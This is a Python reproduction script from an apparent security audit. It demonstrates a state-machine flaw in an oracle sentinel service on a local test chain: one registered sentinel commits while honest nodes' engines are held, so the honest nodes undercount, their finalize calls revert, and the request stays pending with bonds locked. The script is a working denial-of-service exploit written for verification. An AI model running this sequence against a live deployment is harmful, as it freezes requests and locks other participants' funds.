#!/usr/bin/env python3
"""F3-SEN-002, adversarial "never finalizes" route (case 2 of the finding).

A silent registered sentinel M commits while the two honest sentinels A and B still wait for
their engine verdicts (their engines are held just long enough to span M's commit, the finding's
"before the honest engines answer" trigger). Each honest sentinel logs "ignoring unexpected
commitment" for M's commit, so each tallies committed_count below the onchain committedCount.
When A and B reveal, the early-finalize check fires at the undercount, each sends a `finalize`
that reverts `FinalizeTooEarly`, and each parks in WaitingForOutcome. Nobody finalizes after the
reveal deadline: the request stays PENDING and every honest bond stays locked.

Everything is unprivileged: M is just another governance-registered sentinel (as A and B are),
and uses only `commit`. No mocks. Uses MyToken as the fee token so the honest `approveToken`
(55,000 gas) succeeds in Direct mode (F3-SEN-001 is about USDC.e's higher approve cost, a
separate finding); the state-machine defect reproduced here is independent of the fee token.
"""
import signal
import sys
import time

sys.path.insert(0, "/home/sj.guest/.cache/kb-runs/safenet/2026-10-08-rust-audit-run3/scratch/QA3-2B")
import h  # noqa: E402

BINARY = sys.argv[1] if len(sys.argv) > 1 else f"{h.SCRATCH}/bin/sentinel-361aaf3"
LABEL = sys.argv[2] if len(sys.argv) > 2 else "repro"

run_dir = f"{h.SCRATCH}/runs/sen002-{LABEL}-{int(time.time())}"
anvil = h.Anvil(port=31700)
a = bsn = None
try:
    a_addr, a_pk = h.ACCT[1]
    b_addr, b_pk = h.ACCT[2]
    m_addr, m_pk = h.ACCT[3]  # the silent attacker sentinel
    dep = h.Deployment([(a_addr, a_pk), (b_addr, b_pk), (m_addr, m_pk)])
    # M pre-approves the oracle so its single commit can pull the bond.
    h.cast_send(m_pk, dep.fee_token, "approve(address,uint256)", dep.oracle, 10**30)
    h.rpc("evm_setAutomine", [False])
    miner = h.Miner()
    miner.start()
    eng_a = h.Engine(31703, "A")
    eng_b = h.Engine(31704, "B")
    a = h.Sentinel("A", a_pk, dep, 31703, 31705, BINARY, run_dir)
    bsn = h.Sentinel("B", b_pk, dep, 31704, 31706, BINARY, run_dir)
    a.start()
    bsn.start()
    a.wait_log("starting sentinel service", 30)
    bsn.wait_log("starting sentinel service", 30)
    time.sleep(6)

    # Hold both honest engines so the proposal leaves A and B in WaitingForEngineCheck.
    eng_a.hold.set()
    eng_b.hold.set()
    rid = dep.request_id(0)
    dep.propose(wait=False)
    miner.wait_block(h.block_number() + 1)
    p = h.block_number()
    h.log(f"proposal mined in block {p}, request id {rid}")
    # Wait until A and B have each requested their (held) engine check.
    a.wait_log("security_check", 30) if a.find("safe=") else None
    eng_a.requests and eng_b.requests
    for _ in range(60):
        if eng_a.requests and eng_b.requests:
            break
        time.sleep(0.5)
    h.log(f"engines received: A={len(eng_a.requests)} B={len(eng_b.requests)} (held)")

    # M commits (any nonzero hash) while the honest engines are still held.
    h.cast_send(m_pk, dep.oracle, "commit(bytes32,bytes32)", rid,
                "0x1111111111111111111111111111111111111111111111111111111111111111", wait=False)
    miner.wait_block(h.block_number() + 1)
    mblock = h.block_number()
    h.log(f"M committed, mined in block {mblock}; onchain request now {dep.get_request(rid)}")

    # Let A and B process M's commit while still in waiting_for_engine_check.
    a.wait_log("ignoring unexpected commitment", 30)
    bsn.wait_log("ignoring unexpected commitment", 30)
    h.log("both honest sentinels logged 'ignoring unexpected commitment' for M's commit")

    # Release the engines; A and B now commit with an undercounted tally.
    eng_a.hold.clear()
    eng_b.hold.clear()
    h.log("engines released")

    # Run past the reveal deadline and a healthy margin.
    req = dep.get_request(rid)
    miner.wait_block(req["revealDeadline"] + 20)
    time.sleep(3)
    final = dep.get_request(rid)
    h.log(f"commitDeadline={req['commitDeadline']} revealDeadline={req['revealDeadline']}")
    h.log(f"FINAL onchain request (>= revealDeadline+20): {final}")
    for who, name in [(a_addr, "A"), (b_addr, "B"), (m_addr, "M")]:
        h.log(f"commitment[{name}] = {dep.get_commitment(rid, who)}")
    h.log("--- honest sentinel transactions (status 0 = reverted) ---")
    for who, name in [(a_addr, "A"), (b_addr, "B")]:
        for t in dep.txs_from(who, p, h.block_number()):
            h.log(f"  {name}: {t}")
    h.log("--- oracle events ---")
    for e in dep.oracle_events(p, h.block_number()):
        h.log(f"  event {e}")
    print("=== verdict ===")
    print("stuck_pending =", final["state"] == "PENDING")
    a_rev = any(t["fn"] == "finalize" and t["status"] == 0 and "FinalizeTooEarly" in t["replay"] for t in dep.txs_from(a_addr, p, h.block_number()))
    b_rev = any(t["fn"] == "finalize" and t["status"] == 0 and "FinalizeTooEarly" in t["replay"] for t in dep.txs_from(b_addr, p, h.block_number()))
    print("A_sent_reverted_finalize =", a_rev)
    print("B_sent_reverted_finalize =", b_rev)
    no_result = not any(e[2] in ("OracleResult", "RequestTimedOut") for e in dep.oracle_events(p, h.block_number()))
    print("no_oracle_outcome_event =", no_result)
finally:
    for obj in (a, bsn):
        try:
            if obj and obj.proc and obj.proc.poll() is None:
                obj.stop(signal.SIGKILL)
        except Exception:
            pass
    anvil.stop()
